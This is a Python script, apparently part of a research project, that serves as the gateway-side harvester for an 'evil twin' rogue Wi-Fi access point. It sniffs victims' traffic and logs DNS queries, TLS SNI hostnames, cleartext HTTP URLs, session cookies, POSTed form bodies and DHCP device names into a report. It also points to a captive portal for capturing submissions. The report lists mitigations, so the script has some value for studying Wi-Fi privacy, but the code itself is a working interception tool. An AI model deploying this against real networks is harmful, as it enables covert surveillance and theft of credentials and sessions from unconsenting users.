#!/usr/bin/env python3
"""Gateway-side data harvester for the AL-GHUL evil twin.

Two-tier design: the ESP32 is the radio that clients join; this runs on the
laptop acting as the upstream gateway (the twin NATs through it). From that
vantage every victim packet is visible, so we catalogue exactly what an evil
twin learns about a target in 2026, when almost everything is HTTPS.

What it extracts
  - DNS queries                -> the browsing map (where you go)
  - TLS SNI (ClientHello)      -> hostnames even when DNS is encrypted (DoH/DoT)
  - HTTP requests              -> cleartext URLs, Host, cookies, form posts
  - DHCP / mDNS                -> device hostname and vendor ("Soukaina-iPhone")

What it cannot read, and says so
  - HTTPS payloads (bodies) stay encrypted. We log metadata, not contents,
    unless the victim submits to our captive portal (see portal.py).

Run live:     python harvest.py --iface "Local Area Connection* 2"
Run offline:  python harvest.py --pcap capture.pcapng
Output:       experiments/gateway-harvest.md  plus a JSON sidecar.
"""
from __future__ import annotations
import argparse, json, sys, time
from collections import Counter, defaultdict
from pathlib import Path

try:
    from scapy.all import (sniff, rdpcap, DNSQR, Raw, IP, IPv6, UDP, TCP,
                           DHCP, Ether)
    from scapy.layers.tls.extensions import TLS_Ext_ServerName
    from scapy.layers.tls.handshake import TLSClientHello
    HAVE_SCAPY = True
except Exception:
    HAVE_SCAPY = False

# Known trackers/telemetry, so the writeup can call out the ecosystem by name.
LABELS = {
    "branch.io": "Branch deep-link tracking", "sentry.io": "Sentry error tracking",
    "app-measurement.com": "Firebase/Google Analytics", "facebook.com": "Facebook",
    "youtube.com": "YouTube", "ytimg.com": "YouTube images", "miro.com": "Miro",
    "tailscale.com": "Tailscale VPN", "google.com": "Google",
    "doubleclick.net": "Google ads", "googlesyndication.com": "Google ads",
}


def label_for(host: str) -> str | None:
    for suffix, name in LABELS.items():
        if host == suffix or host.endswith("." + suffix):
            return name
    return None


class Harvest:
    def __init__(self) -> None:
        self.dns: Counter[str] = Counter()
        self.sni: Counter[str] = Counter()
        self.http: list[dict] = []
        self.devices: dict[str, dict] = defaultdict(dict)
        self.https_bytes = 0
        self.first = self.last = None

    def seen(self, pkt) -> None:
        if hasattr(pkt, "time"):
            self.first = self.first or pkt.time
            self.last = pkt.time

    def note_device(self, mac: str, **kv) -> None:
        if mac:
            self.devices[mac].update({k: v for k, v in kv.items() if v})

    def handle(self, pkt) -> None:
        self.seen(pkt)
        src_mac = pkt[Ether].src if pkt.haslayer(Ether) else ""

        # DNS questions: the classic browsing map.
        if pkt.haslayer(DNSQR):
            q = pkt[DNSQR].qname
            host = (q.decode(errors="ignore") if isinstance(q, bytes) else str(q)).rstrip(".")
            if host:
                self.dns[host] += 1

        # TLS SNI: survives encrypted DNS, this is the 2026 nuance.
        if HAVE_SCAPY and pkt.haslayer(TLSClientHello):
            for ext in getattr(pkt[TLSClientHello], "ext", []) or []:
                if isinstance(ext, TLS_Ext_ServerName):
                    for sn in ext.servernames:
                        name = sn.servername
                        name = name.decode(errors="ignore") if isinstance(name, bytes) else str(name)
                        if name:
                            self.sni[name] += 1

        # Cleartext HTTP: full URL, Host, cookies, posted form data.
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = bytes(pkt[Raw].load)
            if payload[:4] in (b"GET ", b"POST", b"PUT ", b"HEAD"):
                rec = self._parse_http(payload)
                if rec:
                    self.http.append(rec)
            else:
                self.https_bytes += len(payload)

        # DHCP hostname and vendor: device identity.
        if pkt.haslayer(DHCP):
            host = vendor = ""
            for opt in pkt[DHCP].options:
                if isinstance(opt, tuple) and opt[0] == "hostname":
                    host = opt[1].decode(errors="ignore") if isinstance(opt[1], bytes) else str(opt[1])
                if isinstance(opt, tuple) and opt[0] == "vendor_class_id":
                    vendor = opt[1].decode(errors="ignore") if isinstance(opt[1], bytes) else str(opt[1])
            self.note_device(src_mac, hostname=host, vendor=vendor)

    @staticmethod
    def _parse_http(payload: bytes) -> dict | None:
        try:
            text = payload.decode("latin-1")
        except Exception:
            return None
        lines = text.split("\r\n")
        if not lines:
            return None
        method, _, rest = lines[0].partition(" ")
        path = rest.split(" ")[0]
        headers = {}
        body = ""
        for i, ln in enumerate(lines[1:], 1):
            if ln == "":
                body = "\r\n".join(lines[i + 1:])
                break
            k, _, v = ln.partition(":")
            headers[k.strip().lower()] = v.strip()
        rec = {"method": method, "host": headers.get("host", ""), "path": path}
        if "cookie" in headers:
            rec["cookie"] = headers["cookie"][:200]
        if method == "POST" and body.strip():
            rec["body"] = body[:500]  # cleartext form submissions
        return rec if rec["host"] or rec["path"] else None

    def report(self, out_md: Path, out_json: Path) -> None:
        dur = (self.last - self.first) if (self.first and self.last) else 0
        named = {h: label_for(h) for h in list(self.dns) + list(self.sni)}
        named = {h: n for h, n in named.items() if n}

        data = {
            "duration_s": round(float(dur), 1),
            "dns": dict(self.dns), "sni": dict(self.sni),
            "http": self.http, "devices": self.devices,
            "https_bytes_unreadable": self.https_bytes,
            "recognised_services": sorted(set(named.values())),
        }
        out_json.write_text(json.dumps(data, indent=2), encoding="utf-8")

        L = []
        L.append("# Gateway harvest: what the twin's upstream saw\n")
        L.append(f"Session length: {data['duration_s']} s. "
                 f"HTTPS payload seen but unreadable: {self.https_bytes} bytes.\n")
        L.append("## Device identity")
        for mac, info in self.devices.items():
            bits = ", ".join(f"{k}={v}" for k, v in info.items())
            L.append(f"- `{mac}` {bits}")
        if not self.devices:
            L.append("- (none captured; enable DHCP/mDNS capture)")
        L.append("\n## Hostnames via TLS SNI (leak even with encrypted DNS)")
        for h, c in self.sni.most_common():
            tag = f"  [{named[h]}]" if h in named else ""
            L.append(f"- `{h}` x{c}{tag}")
        if not self.sni:
            L.append("- (none; victim used Encrypted Client Hello, or no TLS seen)")
        L.append("\n## DNS queries (browsing map)")
        for h, c in self.dns.most_common():
            tag = f"  [{named[h]}]" if h in named else ""
            L.append(f"- `{h}` x{c}{tag}")
        L.append("\n## Cleartext HTTP (contents, not just metadata)")
        for r in self.http:
            extra = " +COOKIE" if "cookie" in r else ""
            extra += " +FORMDATA" if "body" in r else ""
            L.append(f"- {r['method']} {r['host']}{r['path']}{extra}")
        if not self.http:
            L.append("- (none; all traffic was HTTPS, so only metadata leaked)")
        L.append("\n## What stayed protected")
        L.append("- HTTPS request/response bodies: encrypted, not recovered here.")
        L.append("- Mitigations that would blind this: WPA3/PMF (no join at all), "
                 "encrypted DNS + ECH (hide SNI), HSTS (block downgrade).")
        out_md.write_text("\n".join(L) + "\n", encoding="utf-8")
        print(f"[+] wrote {out_md}")
        print(f"[+] wrote {out_json}")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("--iface", help="live capture interface (the shared/gateway NIC)")
    g.add_argument("--pcap", help="offline .pcap/.pcapng exported from Wireshark")
    ap.add_argument("--count", type=int, default=0, help="live: stop after N packets")
    ap.add_argument("--timeout", type=int, default=0, help="live: stop after N seconds")
    ap.add_argument("--out", default="../experiments/gateway-harvest.md")
    args = ap.parse_args()

    if not HAVE_SCAPY:
        print("scapy is required:  python -m pip install scapy", file=sys.stderr)
        print("live 802.11-through-gateway capture also needs Npcap on Windows.",
              file=sys.stderr)
        return 2
    try:
        from scapy.all import load_layer
        load_layer("tls")
    except Exception:
        pass

    h = Harvest()
    if args.pcap:
        print(f"[*] reading {args.pcap}")
        for pkt in rdpcap(args.pcap):
            h.handle(pkt)
    else:
        print(f"[*] live capture on {args.iface} (Ctrl-C to stop)")
        sniff(iface=args.iface, prn=h.handle, store=False,
              count=args.count or 0, timeout=args.timeout or None)

    out_md = Path(args.out)
    out_md.parent.mkdir(parents=True, exist_ok=True)
    h.report(out_md, out_md.with_suffix(".json"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
